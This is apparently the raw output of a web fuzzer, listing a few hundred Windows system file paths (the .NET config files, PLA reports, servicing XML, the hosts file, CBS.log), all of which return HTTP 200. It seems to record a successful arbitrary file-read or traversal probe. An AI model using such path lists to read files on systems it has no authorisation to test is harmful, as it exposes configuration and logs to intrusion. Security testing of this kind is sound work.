000004384:   200        5 L      7 W        144 Ch      "Windows/Microsoft.NET/Framework/v4.0.30319/Microsoft.Workflow.Compiler.exe.config"                    
000004383:   200        7 L      16 W       281 Ch      "Windows/Microsoft.NET/Framework/v4.0.30319/jsc.exe.config"                                            
000004381:   200        6 L      12 W       223 Ch      "Windows/Microsoft.NET/Framework/v4.0.30319/ilasm.exe.config"                                          
000004382:   200        6 L      10 W       182 Ch      "Windows/Microsoft.NET/Framework/v4.0.30319/InstallUtil.exe.config"                                    
000004380:   200        13 L     47 W       893 Ch      "Windows/Microsoft.NET/Framework/v4.0.30319/dfsvc.exe.config"                                          
000004379:   200        6 L      10 W       154 Ch      "Windows/Microsoft.NET/Framework/v4.0.30319/DataSvcUtil.exe.config"                                    
000004378:   200        7 L      16 W       281 Ch      "Windows/Microsoft.NET/Framework/v4.0.30319/cvtres.exe.config"                                         
000004377:   200        6 L      10 W       182 Ch      "Windows/Microsoft.NET/Framework/v4.0.30319/csc.exe.config"                                            
000004374:   200        145 L    276 W      9928 Ch     "Windows/Microsoft.NET/Framework/v4.0.30319/Config/web_mediumtrust.config"                             
000004373:   200        95 L     169 W      6012 Ch     "Windows/Microsoft.NET/Framework/v4.0.30319/Config/web_lowtrust.config"                                
000004372:   200        159 L    303 W      10852 Ch    "Windows/Microsoft.NET/Framework/v4.0.30319/Config/web_hightrust.config"                               
000004371:   200        39 L     128 W      2067 Ch     "Windows/Microsoft.NET/Framework/v4.0.30319/Config/NetFx45_IIS_schema_update.xml"                      
000004370:   200        54 L     181 W      3445 Ch     "Windows/Microsoft.NET/Framework/v4.0.30319/Config/NetFx40_IIS_schema_update.xml"                      
000004376:   200        475 L    1640 W     43133 Ch    "Windows/Microsoft.NET/Framework/v4.0.30319/Config/web.config"                                         
000004368:   200        110 L    203 W      7122 Ch     "Windows/Microsoft.NET/Framework/v4.0.30319/Config/legacy.web_minimaltrust.config"                     
000004369:   200        291 L    1418 W     35982 Ch    "Windows/Microsoft.NET/Framework/v4.0.30319/Config/machine.config"                                     
000004367:   200        171 L    327 W      11744 Ch    "Windows/Microsoft.NET/Framework/v4.0.30319/Config/legacy.web_mediumtrust.config"                      
000004366:   200        125 L    229 W      8176 Ch     "Windows/Microsoft.NET/Framework/v4.0.30319/Config/legacy.web_lowtrust.config"                         
000004365:   200        183 L    351 W      12550 Ch    "Windows/Microsoft.NET/Framework/v4.0.30319/Config/legacy.web_hightrust.config"                        
000004363:   200        10 L     20 W       368 Ch      "Windows/Microsoft.NET/Framework/v4.0.30319/caspol.exe.config"                                         
000004362:   200        11 L     23 W       437 Ch      "Windows/Microsoft.NET/Framework/v4.0.30319/Aspnet.config"                                             
000004358:   200        28 L     47 W       1040 Ch     "Windows/Microsoft.NET/Framework/v4.0.30319/ASP.NETWebAdminFiles/web.config"                           
000004364:   200        321 L    2215 W     46038 Ch    "Windows/Microsoft.NET/Framework/v4.0.30319/clientexclusionlist.xml"                                   
000004357:   200        9 L      17 W       317 Ch      "Windows/Microsoft.NET/Framework/v4.0.30319/ASP.NETWebAdminFiles/App_Data/GroupedProviders.xml"        
000004356:   200        7 L      16 W       281 Ch      "Windows/Microsoft.NET/Framework/v4.0.30319/applaunch.exe.config"                                      
000004361:   200        466 L    1826 W     42976 Ch    "Windows/Microsoft.NET/Framework/v4.0.30319/aspnet_state_perf.ini"                                     
000004355:   200        7 L      12 W       161 Ch      "Windows/Microsoft.NET/Framework/v4.0.30319/AddInUtil.exe.config"                                      
000004354:   200        7 L      12 W       161 Ch      "Windows/Microsoft.NET/Framework/v4.0.30319/AddInProcess32.exe.config"                                 
000004353:   200        7 L      12 W       161 Ch      "Windows/Microsoft.NET/Framework/v4.0.30319/AddInProcess.exe.config"                                   
000004350:   200        6 L      10 W       154 Ch      "Windows/Microsoft.NET/Framework/v3.5/EdmGen.exe.config"                                               
000004352:   200        7 L      13 W       221 Ch      "Windows/Microsoft.NET/Framework/v3.5/vbc.exe.config"                                                  
000004349:   200        6 L      10 W       154 Ch      "Windows/Microsoft.NET/Framework/v3.5/DataSvcUtil.exe.config"                                          
000004346:   200        7 L      11 W       158 Ch      "Windows/Microsoft.NET/Framework/v3.5/AddInProcess32.exe.config"                                       
000004348:   200        7 L      13 W       221 Ch      "Windows/Microsoft.NET/Framework/v3.5/csc.exe.config"                                                  
000004388:   200        6 L      12 W       223 Ch      "Windows/Microsoft.NET/Framework/v4.0.30319/regsvcs.exe.config"                                        
000004392:   200        9 L      17 W       317 Ch      "Windows/Microsoft.NET/Framework64/v2.0.50727/ASP.NETWebAdminFiles/App_Data/GroupedProviders.xml"      
000004400:   200        195 L    1037 W     26035 Ch    "Windows/Microsoft.NET/Framework64/v2.0.50727/CONFIG/machine.config"                                   
000004416:   200        6 L      10 W       161 Ch      "Windows/Microsoft.NET/Framework64/v3.0/WPF/PresentationFontCache.exe.config"                          
000004427:   200        7 L      12 W       161 Ch      "Windows/Microsoft.NET/Framework64/v4.0.30319/AddInUtil.exe.config"                                    
000004426:   200        7 L      12 W       161 Ch      "Windows/Microsoft.NET/Framework64/v4.0.30319/AddInProcess32.exe.config"                               
000004425:   200        7 L      12 W       161 Ch      "Windows/Microsoft.NET/Framework64/v4.0.30319/AddInProcess.exe.config"                                 
000004424:   200        7 L      13 W       221 Ch      "Windows/Microsoft.NET/Framework64/v3.5/vbc.exe.config"                                                
000004423:   200        28 L     74 W       1581 Ch     "Windows/Microsoft.NET/Framework64/v3.5/msbuild.exe.config"                                            
000004422:   200        6 L      10 W       154 Ch      "Windows/Microsoft.NET/Framework64/v3.5/EdmGen.exe.config"                                             
000004359:   200        8579 L   49258 W    996613 Ch   "Windows/Microsoft.NET/Framework/v4.0.30319/aspnet_perf.ini"                                           
000004421:   200        6 L      10 W       154 Ch      "Windows/Microsoft.NET/Framework64/v3.5/DataSvcUtil.exe.config"                                        
000004420:   200        7 L      13 W       221 Ch      "Windows/Microsoft.NET/Framework64/v3.5/csc.exe.config"                                                
000004419:   200        7 L      11 W       158 Ch      "Windows/Microsoft.NET/Framework64/v3.5/AddInUtil.exe.config"                                          
000004322:   200        7196 L   40071 W    816998 Ch   "Windows/Microsoft.NET/Framework/v2.0.50727/aspnet_perf2.ini"                                          
000004418:   200        7 L      11 W       158 Ch      "Windows/Microsoft.NET/Framework64/v3.5/AddInProcess32.exe.config"                                     
000004415:   200        49 L     107 W      1951 Ch     "Windows/Microsoft.NET/Framework64/v3.0/Windows Communication Foundation/SMSvcHost.exe.config"         
000004417:   200        7 L      11 W       158 Ch      "Windows/Microsoft.NET/Framework64/v3.5/AddInProcess.exe.config"                                       
000004414:   200        7 L      13 W       221 Ch      "Windows/Microsoft.NET/Framework64/v2.0.50727/vbc.exe.config"                                          
000004413:   200        6 L      11 W       181 Ch      "Windows/Microsoft.NET/Framework64/v2.0.50727/regsvcs.exe.config"                                      
000004412:   200        6 L      11 W       181 Ch      "Windows/Microsoft.NET/Framework64/v2.0.50727/regasm.exe.config"                                       
000004411:   200        58 L     502 W      10192 Ch    "Windows/Microsoft.NET/Framework64/v2.0.50727/RedistList/FrameworkList.xml"                            
000004410:   200        14 L     24 W       559 Ch      "Windows/Microsoft.NET/Framework64/v2.0.50727/msbuild.exe.config"                                      
000004409:   200        7 L      13 W       221 Ch      "Windows/Microsoft.NET/Framework64/v2.0.50727/jsc.exe.config"                                          
000004408:   200        6 L      11 W       181 Ch      "Windows/Microsoft.NET/Framework64/v2.0.50727/ilasm.exe.config"                                        
000004407:   200        6 L      11 W       181 Ch      "Windows/Microsoft.NET/Framework64/v2.0.50727/ieexec.exe.config"                                       
000004406:   200        7 L      13 W       221 Ch      "Windows/Microsoft.NET/Framework64/v2.0.50727/csc.exe.config"                                          
000004405:   200        339 L    1153 W     32780 Ch    "Windows/Microsoft.NET/Framework64/v2.0.50727/CONFIG/web.config"                                       
000004360:   200        8579 L   49108 W    994657 Ch   "Windows/Microsoft.NET/Framework/v4.0.30319/aspnet_perf2.ini"                                          
000004386:   200        2969 L   38816 W    526985 Ch   "Windows/Microsoft.NET/Framework/v4.0.30319/ngen.log"                                                  
000004404:   200        110 L    203 W      7122 Ch     "Windows/Microsoft.NET/Framework64/v2.0.50727/CONFIG/web_minimaltrust.config"                          
000004403:   200        69 L     311 W      8260 Ch     "Windows/Microsoft.NET/Framework64/v2.0.50727/CONFIG/web_mediumtrust.config"                           
000004399:   200        6 L      11 W       181 Ch      "Windows/Microsoft.NET/Framework64/v2.0.50727/caspol.exe.config"                                       
000004402:   200        125 L    229 W      8176 Ch     "Windows/Microsoft.NET/Framework64/v2.0.50727/CONFIG/web_lowtrust.config"                              
000004396:   200        7 L      12 W       205 Ch      "Windows/Microsoft.NET/Framework64/v2.0.50727/Aspnet_regsql.exe.config"                                
000004401:   200        70 L     330 W      8692 Ch     "Windows/Microsoft.NET/Framework64/v2.0.50727/CONFIG/web_hightrust.config"                             
000004398:   200        9 L      18 W       323 Ch      "Windows/Microsoft.NET/Framework64/v2.0.50727/Aspnet.config"                                           
000004397:   200        430 L    1675 W     39634 Ch    "Windows/Microsoft.NET/Framework64/v2.0.50727/aspnet_state_perf.ini"                                   
000004391:   200        6 L      10 W       182 Ch      "Windows/Microsoft.NET/Framework/v4.0.30319/vbc.exe.config"                                            
000004393:   200        21 L     32 W       716 Ch      "Windows/Microsoft.NET/Framework64/v2.0.50727/ASP.NETWebAdminFiles/web.config"                         
000004390:   200        302 L    5099 W     61714 Ch    "Windows/Microsoft.NET/Framework/v4.0.30319/ThirdPartyNotices.txt"                                     
000004389:   200        53 L     136 W      2262 Ch     "Windows/Microsoft.NET/Framework/v4.0.30319/SMSvcHost.exe.config"                                      
000004387:   200        7 L      16 W       281 Ch      "Windows/Microsoft.NET/Framework/v4.0.30319/regasm.exe.config"                                         
000004428:   200        7 L      16 W       281 Ch      "Windows/Microsoft.NET/Framework64/v4.0.30319/applaunch.exe.config"                                    
000004430:   200        28 L     47 W       1040 Ch     "Windows/Microsoft.NET/Framework64/v4.0.30319/ASP.NETWebAdminFiles/web.config"                         
000004434:   200        11 L     23 W       437 Ch      "Windows/Microsoft.NET/Framework64/v4.0.30319/Aspnet.config"                                           
000004442:   200        54 L     181 W      3445 Ch     "Windows/Microsoft.NET/Framework64/v4.0.30319/Config/NetFx40_IIS_schema_update.xml"                    
000004448:   200        475 L    1640 W     43133 Ch    "Windows/Microsoft.NET/Framework64/v4.0.30319/Config/web.config"                                       
000004447:   200        82 L     143 W      4962 Ch     "Windows/Microsoft.NET/Framework64/v4.0.30319/Config/web_minimaltrust.config"                          
000004446:   200        145 L    276 W      9928 Ch     "Windows/Microsoft.NET/Framework64/v4.0.30319/Config/web_mediumtrust.config"                           
000004445:   200        95 L     169 W      6012 Ch     "Windows/Microsoft.NET/Framework64/v4.0.30319/Config/web_lowtrust.config"                              
000004444:   200        159 L    303 W      10852 Ch    "Windows/Microsoft.NET/Framework64/v4.0.30319/Config/web_hightrust.config"                             
000004441:   200        291 L    1418 W     35982 Ch    "Windows/Microsoft.NET/Framework64/v4.0.30319/Config/machine.config"                                   
000004443:   200        39 L     128 W      2067 Ch     "Windows/Microsoft.NET/Framework64/v4.0.30319/Config/NetFx45_IIS_schema_update.xml"                    
000004440:   200        110 L    203 W      7122 Ch     "Windows/Microsoft.NET/Framework64/v4.0.30319/Config/legacy.web_minimaltrust.config"                   
000004439:   200        171 L    327 W      11744 Ch    "Windows/Microsoft.NET/Framework64/v4.0.30319/Config/legacy.web_mediumtrust.config"                    
000004438:   200        125 L    229 W      8176 Ch     "Windows/Microsoft.NET/Framework64/v4.0.30319/Config/legacy.web_lowtrust.config"                       
000004437:   200        183 L    351 W      12550 Ch    "Windows/Microsoft.NET/Framework64/v4.0.30319/Config/legacy.web_hightrust.config"                      
000004436:   200        252 L    1752 W     35944 Ch    "Windows/Microsoft.NET/Framework64/v4.0.30319/clientexclusionlist.xml"                                 
000004435:   200        10 L     20 W       368 Ch      "Windows/Microsoft.NET/Framework64/v4.0.30319/caspol.exe.config"                                       
000004433:   200        466 L    1826 W     42976 Ch    "Windows/Microsoft.NET/Framework64/v4.0.30319/aspnet_state_perf.ini"                                   
000004429:   200        9 L      17 W       317 Ch      "Windows/Microsoft.NET/Framework64/v4.0.30319/ASP.NETWebAdminFiles/App_Data/GroupedProviders.xml"      
000004449:   200        6 L      10 W       182 Ch      "Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe.config"                                          
000004451:   200        6 L      10 W       154 Ch      "Windows/Microsoft.NET/Framework64/v4.0.30319/DataSvcUtil.exe.config"                                  
000004455:   200        7 L      16 W       281 Ch      "Windows/Microsoft.NET/Framework64/v4.0.30319/jsc.exe.config"                                          
000004463:   200        6 L      10 W       182 Ch      "Windows/Microsoft.NET/Framework64/v4.0.30319/vbc.exe.config"                                          
000004490:   200        34 L     286 W      3576 Ch     "Windows/Panther/UnattendGC/setupact.log"                                                              
000004489:   200        860 L    1644 W     26599 Ch    "Windows/Panther/UnattendGC/diagwrn.xml"                                                               
000004488:   200        860 L    1644 W     26599 Ch    "Windows/Panther/UnattendGC/diagerr.xml"                                                               
000004431:   200        8579 L   49258 W    996613 Ch   "Windows/Microsoft.NET/Framework64/v4.0.30319/aspnet_perf.ini"                                         
000004461:   200        53 L     136 W      2262 Ch     "Windows/Microsoft.NET/Framework64/v4.0.30319/SMSvcHost.exe.config"                                    
000004460:   200        6 L      12 W       223 Ch      "Windows/Microsoft.NET/Framework64/v4.0.30319/regsvcs.exe.config"                                      
000004459:   200        7 L      16 W       281 Ch      "Windows/Microsoft.NET/Framework64/v4.0.30319/regasm.exe.config"                                       
000004462:   200        302 L    5099 W     61714 Ch    "Windows/Microsoft.NET/Framework64/v4.0.30319/ThirdPartyNotices.txt"                                   
000004457:   200        30 L     94 W       1734 Ch     "Windows/Microsoft.NET/Framework64/v4.0.30319/msbuild.exe.config"                                      
000004454:   200        6 L      10 W       182 Ch      "Windows/Microsoft.NET/Framework64/v4.0.30319/InstallUtil.exe.config"                                  
000004456:   200        5 L      7 W        144 Ch      "Windows/Microsoft.NET/Framework64/v4.0.30319/Microsoft.Workflow.Compiler.exe.config"                  
000004453:   200        6 L      12 W       223 Ch      "Windows/Microsoft.NET/Framework64/v4.0.30319/ilasm.exe.config"                                        
000004450:   200        7 L      16 W       281 Ch      "Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe.config"                                       
000004452:   200        13 L     47 W       893 Ch      "Windows/Microsoft.NET/Framework64/v4.0.30319/dfsvc.exe.config"                                        
000004493:   200        62 L     528 W      17070 Ch    "Windows/PFRO.log"                                                                                     
000004497:   200        156 L    971 W      12809 Ch    "Windows/PLA/Reports/en-US/Report.System.Configuration.xml"                                            
000004505:   200        13 L     26 W       609 Ch      "Windows/PLA/Reports/en-US/Report.System.Summary.xml"                                                  
000004511:   200        66 L     616 W      7242 Ch     "Windows/PLA/Reports/Report.System.Diagnostics.xml"                                                    
000004491:   200        0 L      0 W        0 Ch        "Windows/Panther/UnattendGC/setuperr.log"                                                              
000004510:   200        95 L     246 W      4439 Ch     "Windows/PLA/Reports/Report.System.CPU.xml"                                                            
000004509:   200        393 L    1632 W     27570 Ch    "Windows/PLA/Reports/Report.System.Configuration.xml"                                                  
000004464:   200        542 L    6465 W     209508 Ch   "windows/notepad.exe"                                                                                  
000004508:   200        27 L     137 W      1927 Ch     "Windows/PLA/Reports/Report.System.Common.xml"                                                         
000004394:   200        7196 L   40185 W    818858 Ch   "Windows/Microsoft.NET/Framework64/v2.0.50727/aspnet_perf.ini"                                         
000004507:   200        143 L    1499 W     17448 Ch    "Windows/PLA/Reports/en-US/Report.System.Wireless.xml"                                                 
000004504:   200        8 L      21 W       356 Ch      "Windows/PLA/Reports/en-US/Report.System.Performance.xml"                                              
000004506:   200        90 L     831 W      9791 Ch     "Windows/PLA/Reports/en-US/Report.System.Wired.xml"                                                    
000004503:   200        27 L     92 W       1312 Ch     "Windows/PLA/Reports/en-US/Report.System.Network.xml"                                                  
000004502:   200        50 L     510 W      5863 Ch     "Windows/PLA/Reports/en-US/Report.System.NetDiagFramework.xml"                                         
000004501:   200        15 L     37 W       667 Ch      "Windows/PLA/Reports/en-US/Report.System.Memory.xml"                                                   
000004500:   200        12 L     224 W      1822 Ch     "Windows/PLA/Reports/en-US/Report.System.Disk.xml"                                                     
000004395:   200        7196 L   40071 W    817004 Ch   "Windows/Microsoft.NET/Framework64/v2.0.50727/aspnet_perf2.ini"                                        
000004499:   200        63 L     606 W      6962 Ch     "Windows/PLA/Reports/en-US/Report.System.Diagnostics.xml"                                              
000004496:   200        24 L     127 W      1764 Ch     "Windows/PLA/Reports/en-US/Report.System.Common.xml"                                                   
000004498:   200        14 L     39 W       688 Ch      "Windows/PLA/Reports/en-US/Report.System.CPU.xml"                                                      
000004512:   200        45 L     310 W      3198 Ch     "Windows/PLA/Reports/Report.System.Disk.xml"                                                           
000004514:   200        521 L    1629 W     29356 Ch    "Windows/PLA/Reports/Report.System.NetDiagFramework.xml"                                               
000004492:   200        75 L     784 W      6246 Ch     "Windows/Performance/WinSAT/winsat.log"                                                                
000004518:   200        16 L     36 W       739 Ch      "Windows/PLA/Reports/Report.System.Summary.xml"                                                        
000004526:   200        21 L     112 W      1269 Ch     "Windows/PLA/Rules/en-US/Rules.System.Finale.xml"                                                      
000004531:   200        28 L     149 W      2060 Ch     "Windows/PLA/Rules/en-US/Rules.System.Summary.xml"                                                     
000004530:   200        7 L      18 W       296 Ch      "Windows/PLA/Rules/en-US/Rules.System.Performance.xml"                                                 
000004529:   200        8 L      25 W       376 Ch      "Windows/PLA/Rules/en-US/Rules.System.Network.xml"                                                     
000004528:   200        54 L     1064 W     10804 Ch    "Windows/PLA/Rules/en-US/Rules.System.NetDiagFramework.xml"                                            
000004525:   200        13 L     148 W      1340 Ch     "Windows/PLA/Rules/en-US/Rules.System.Disk.xml"                                                        
000004527:   200        19 L     179 W      2067 Ch     "Windows/PLA/Rules/en-US/Rules.System.Memory.xml"                                                      
000004523:   200        14 L     121 W      1331 Ch     "Windows/PLA/Rules/en-US/Rules.System.CPU.xml"                                                         
000004524:   200        158 L    2817 W     28519 Ch    "Windows/PLA/Rules/en-US/Rules.System.Diagnostics.xml"                                                 
000004522:   200        144 L    1915 W     19955 Ch    "Windows/PLA/Rules/en-US/Rules.System.Configuration.xml"                                               
000004521:   200        9 L      66 W       666 Ch      "Windows/PLA/Rules/en-US/Rules.System.Common.xml"                                                      
000004517:   200        11 L     31 W       471 Ch      "Windows/PLA/Reports/Report.System.Performance.xml"                                                    
000004519:   200        291 L    1358 W     19290 Ch    "Windows/PLA/Reports/Report.System.Wired.xml"                                                          
000004516:   200        97 L     290 W      5129 Ch     "Windows/PLA/Reports/Report.System.Network.xml"                                                        
000004513:   200        121 L    287 W      4822 Ch     "Windows/PLA/Reports/Report.System.Memory.xml"                                                         
000004458:   200        3717 L   46193 W    639023 Ch   "Windows/Microsoft.NET/Framework64/v4.0.30319/ngen.log"                                                
000004520:   200        980 L    3541 W     59620 Ch    "Windows/PLA/Reports/Report.System.Wireless.xml"                                                       
000004515:   200        6 L      16 W       423 Ch      "Windows/PLA/Reports/Report.System.NetTrace.xml"                                                       
000004532:   200        40 L     512 W      5587 Ch     "Windows/PLA/Rules/en-US/Rules.System.Wired.xml"                                                       
000004538:   200        96 L     423 W      6429 Ch     "Windows/PLA/Rules/Rules.System.Disk.xml"                                                              
000004534:   200        52 L     196 W      3059 Ch     "Windows/PLA/Rules/Rules.System.Common.xml"                                                            
000004546:   200        810 L    2006 W     40912 Ch    "Windows/PLA/Rules/Rules.System.Wired.xml"                                                             
000004548:   200        262 L    554 W      13542 Ch    "Windows/PLA/System/System Diagnostics.xml"                                                            
000004545:   200        326 L    1082 W     18553 Ch    "Windows/PLA/Rules/Rules.System.Summary.xml"                                                           
000004544:   200        92 L     176 W      3434 Ch     "Windows/PLA/Rules/Rules.System.Performance.xml"                                                       
000004542:   200        6 L      16 W       391 Ch      "Windows/PLA/Rules/Rules.System.NetTrace.xml"                                                          
000004543:   200        82 L     172 W      3458 Ch     "Windows/PLA/Rules/Rules.System.Network.xml"                                                           
000004547:   200        2617 L   6385 W     159934 Ch   "Windows/PLA/Rules/Rules.System.Wireless.xml"                                                          
000004432:   200        8579 L   49108 W    994657 Ch   "Windows/Microsoft.NET/Framework64/v4.0.30319/aspnet_perf2.ini"                                        
000004541:   200        852 L    2910 W     57286 Ch    "Windows/PLA/Rules/Rules.System.NetDiagFramework.xml"                                                  
000004540:   200        211 L    624 W      12915 Ch    "Windows/PLA/Rules/Rules.System.Memory.xml"                                                            
000004539:   200        164 L    367 W      7129 Ch     "Windows/PLA/Rules/Rules.System.Finale.xml"                                                            
000004536:   200        147 L    435 W      9019 Ch     "Windows/PLA/Rules/Rules.System.CPU.xml"                                                               
000004533:   200        77 L     1121 W     13097 Ch    "Windows/PLA/Rules/en-US/Rules.System.Wireless.xml"                                                    
000004549:   200        113 L    191 W      4833 Ch     "Windows/PLA/System/System Performance.xml"                                                            
000004555:   200        1012 L   2606 W     28861 Ch    "Windows/Provisioning/CountryTable.xml"                                                                
000004563:   200        61 L     111 W      1954 Ch     "Windows/schemas/CodeIntegrity/ExamplePolicies/AllowAll.xml"                                           
000004565:   200        265 L    796 W      11010 Ch    "Windows/schemas/CodeIntegrity/ExamplePolicies/DefaultWindows_Audit.xml"                               
000004562:   200        64 L     117 W      2052 Ch     "Windows/schemas/CodeIntegrity/ExamplePolicies/AllowAll_EnableHVCI.xml"                                
000004564:   200        171 L    431 W      7040 Ch     "Windows/schemas/CodeIntegrity/ExamplePolicies/AllowMicrosoft.xml"                                     
000004253:   200        45883    680881 W   8421537 C   "Windows/Logs/CBS/CBS.log"                                                                             
                        L                   h                                                                                                                  
000004537:   200        2576 L   7795 W     169025 Ch   "Windows/PLA/Rules/Rules.System.Diagnostics.xml"                                                       
000004554:   200        302 L    419 W      7062 Ch     "Windows/Provisioning/categories.xml"                                                                  
000004556:   200        868 L    1516 W     29569 Ch    "Windows/Provisioning/IccidToRegion.xml"                                                               
000004550:   200        179 L    1353 W     12442 Ch    "Windows/PLA/Templates/WDAC_Diagnostics.xml"                                                           
000004553:   200        68 L     106 W      2810 Ch     "Windows/PrintDialog/appxmanifest.xml"                                                                 
000004552:   200        1 L      12 W       319 Ch      "Windows/PrintDialog/appxblockmap.xml"                                                                 
000004566:   200        262 L    794 W      10949 Ch    "Windows/schemas/CodeIntegrity/ExamplePolicies/DefaultWindows_Enforced.xml"                            
000004535:   200        3871 L   10910 W    287788 Ch   "Windows/PLA/Rules/Rules.System.Configuration.xml"                                                     
000004551:   200        3473 L   7517 W     378100 Ch   "Windows/prefetch/Layout.ini"                                                                          
000004580:   200        334 L    462 W      30831 Ch    "Windows/servicing/Editions/EnterpriseEdition.xml"                                                     
000004572:   200        651 L    1149 W     63947 Ch    "Windows/ServiceProfiles/LocalService/AppData/Local/Microsoft/Windows/Shell/DefaultLayouts.xml"        
000004589:   200        16 L     93 W       1110 Ch     "Windows/servicing/Editions/WimBootConfig.ini"                                                         
000004587:   200        333 L    459 W      30791 Ch    "Windows/servicing/Editions/ServerRdshEdition.xml"                                                     
000004588:   200        646 L    3880 W     80077 Ch    "Windows/servicing/Editions/UpgradeMatrix.xml"                                                         
000004586:   200        333 L    459 W      30791 Ch    "Windows/servicing/Editions/ProfessionalWorkstationEdition.xml"                                        
000004585:   200        333 L    459 W      30791 Ch    "Windows/servicing/Editions/ProfessionalSingleLanguageEdition.xml"                                     
000004584:   200        333 L    459 W      30791 Ch    "Windows/servicing/Editions/ProfessionalEducationEdition.xml"                                          
000004590:   200        366 L    2154 W     89629 Ch    "Windows/servicing/InboxFodMetadataCache/ActionList.xml"                                               
000004583:   200        334 L    462 W      30831 Ch    "Windows/servicing/Editions/ProfessionalEdition.xml"                                                   
000004582:   200        333 L    459 W      30791 Ch    "Windows/servicing/Editions/ProfessionalCountrySpecificEdition.xml"                                    
000004579:   200        333 L    459 W      30791 Ch    "Windows/servicing/Editions/EducationEdition.xml"                                                      
000004578:   200        42 L     159 W      3782 Ch     "Windows/servicing/Editions/EditionMatrix.xml"                                                         
000004581:   200        333 L    459 W      30791 Ch    "Windows/servicing/Editions/IoTEnterpriseEdition.xml"                                                  
000004577:   200        107 L    124 W      2676 Ch     "Windows/servicing/Editions/EditionMappings.xml"                                                       
000004574:   200        651 L    1149 W     63947 Ch    "Windows/ServiceProfiles/NetworkService/AppData/Local/Microsoft/Windows/Shell/DefaultLayouts.xml"      
000004571:   200        3 L      7 W        80 Ch       "Windows/ServiceProfiles/LocalService/AppData/Local/Microsoft/Windows Sidebar/settings.ini"            
000004573:   200        3 L      7 W        80 Ch       "Windows/ServiceProfiles/NetworkService/AppData/Local/Microsoft/Windows Sidebar/settings.ini"          
000004567:   200        53 L     97 W       1678 Ch     "Windows/schemas/CodeIntegrity/ExamplePolicies/DenyAllAudit.xml"                                       
000004636:   200        33 L     33 W       494 Ch      "Windows/Speech/Engines/TTS/en-US/M1033ZIR.INI"                                                        
000004575:   200        418 L    2452 W     47478 Ch    "Windows/ServiceProfiles/NetworkService/AppData/Local/Temp/MpCmdRun.log"                               
000004641:   200        50 L     98 W       3232 Ch     "Windows/System32/AppxProvisioning.xml"                                                                
000004640:   200        5 L      10 W       189 Ch      "Windows/System32/AppV/AppVStreamingUX.exe.config"                                                     
000004635:   200        27 L     85 W       857 Ch      "Windows/Speech/Engines/SR/en-US/l1033.ini"                                                            
000004637:   200        13 L     15 W       219 Ch      "windows/system.ini"                                                                                   
000004639:   200        1649 L   5285 W     134538 Ch   "Windows/System32/appraiser/Appraiser_TelemetryRunList.xml"                                            
000004633:   200        32 L     65 W       1386 Ch     "Windows/Speech_OneCore/Engines/TTS/en-US/MSTTSLocEnUS.INI"                                            
000004632:   200        80 L     71 W       1359 Ch     "Windows/Speech_OneCore/Engines/TTS/en-US/M1033Zira.INI"                                               
000004631:   200        77 L     69 W       1234 Ch     "Windows/Speech_OneCore/Engines/TTS/en-US/M1033Mark.INI"                                               
000004630:   200        90 L     78 W       1645 Ch     "Windows/Speech_OneCore/Engines/TTS/en-US/M1033Eva.INI"                                                
000004642:   200        748 L    7514 W     114699 Ch   "Windows/System32/catroot2/dberr.txt"                                                                  
000004629:   200        57 L     61 W       912 Ch      "Windows/Speech_OneCore/Engines/TTS/en-US/M1033David.INI"                                              
000004623:   200        25 L     66 W       626 Ch      "Windows/Speech_OneCore/Engines/SR/en-US-N/l1033.ini"                                                  
000004615:   200        2 L      2 W        42 Ch       "Windows/Setup/State/State.ini"                                                                        
000004638:   200        6249 L   5172 W     177756 Ch   "Windows/System32/appraiser/Appraiser_Data.ini"                                                        
000004621:   200        945 L    20149 W    525096 Ch   "Windows/SoftwareDistribution/ReportingEvents.log"                                                     
000004662:   200        5 L      14 W       642 Ch      "Windows/System32/config/systemprofile/AppData/Local/Microsoft/CLR_v4.0/UsageLogs/NGenTask.exe.log"    
000004569:   200        0 L      1 W        1048576 C   "Windows/security/database/edbtmp.log"                                                                 
                                            h                                                                                                                  
000004667:   200        1946 L   3904 W     61581 Ch    "Windows/System32/DDFs/DMClient_DDF.xml"                                                               
000004665:   200        3 L      6 W        226 Ch      "Windows/System32/config/systemprofile/AppData/Local/Microsoft/CLR_v4.0/UsageLogs/taskhostw.exe.log"   
000004666:   200        1642 L   3038 W     74583 Ch    "Windows/System32/DDFs/CertificateStore_DDF.xml"                                                       
000004663:   200        16 L     58 W       2478 Ch     "Windows/System32/config/systemprofile/AppData/Local/Microsoft/CLR_v4.0/UsageLogs/powershell.exe.log"  
000004568:   200        8 L      21 W       1048576 C   "Windows/security/database/edb.log"                                                                    
                                            h                                                                                                                  
000004668:   200        883 L    2595 W     37054 Ch    "Windows/System32/DDFs/EnrollmentStatusTrackingDDF.xml"                                                
000004674:   200        14 L     68 W       646 Ch      "Windows/System32/drivers/gmreadme.txt"                                                                
000004670:   200        1359 L   4520 W     55460 Ch    "Windows/System32/DDFs/NGCProDDF_v1.2_final.xml"                                                       
000004259:   200        36823    358900 W   4910242 C   "Windows/Logs/MoSetup/UpdateAgent.log"                                                                 
                        L                   h                                                                                                                  
000004673:   200        21 L     134 W      824 Ch      "windows/system32/drivers/etc/hosts"                                                                   
000004672:   200        158 L    318 W      3942 Ch     "Windows/System32/DetailedReading-Default.xml"                                                         
000004669:   200        1103 L   1365 W     29989 Ch    "Windows/System32/DDFs/EnterpriseModernAppManagementDDF.xml"                                           
000004671:   200        513 L    1283 W     20213 Ch    "Windows/System32/DDFs/Win32CompatibilityAppraiser_DDF.xml"                                            
000004717:   200        42 L     157 W      3007 Ch     "Windows/System32/F12/Timeline.cpu.xml"                                                                
000004721:   200        82 L     91 W       2612 Ch     "Windows/System32/icsxml/potscfg.xml"                                                                  
000004733:   200        51 L     648 W      8960 Ch     "Windows/System32/LogFiles/setupcln/setuperr.log"                                                      
000004734:   200        1056 L   2113 W     33460 Ch    "Windows/System32/MailContactsCalendarSync/LiveDomainList.txt"                                         
000004731:   200        624 L    1300 W     20773 Ch    "Windows/System32/LogFiles/setupcln/diagwrn.xml"                                                       
000004730:   200        671 L    2542 W     36782 Ch    "Windows/System32/LogFiles/setupcln/diagerr.xml"                                                       
000004732:   200        893 L    8690 W     125480 Ch   "Windows/System32/LogFiles/setupcln/setupact.log"                                                      
000004720:   200        46 L     35 W       780 Ch      "Windows/System32/icsxml/osinfo.xml"                                                                   
000004722:   200        404 L    429 W      14434 Ch    "Windows/System32/icsxml/pppcfg.xml"                                                                   
000004719:   200        373 L    397 W      13451 Ch    "Windows/System32/icsxml/ipcfg.xml"                                                                    
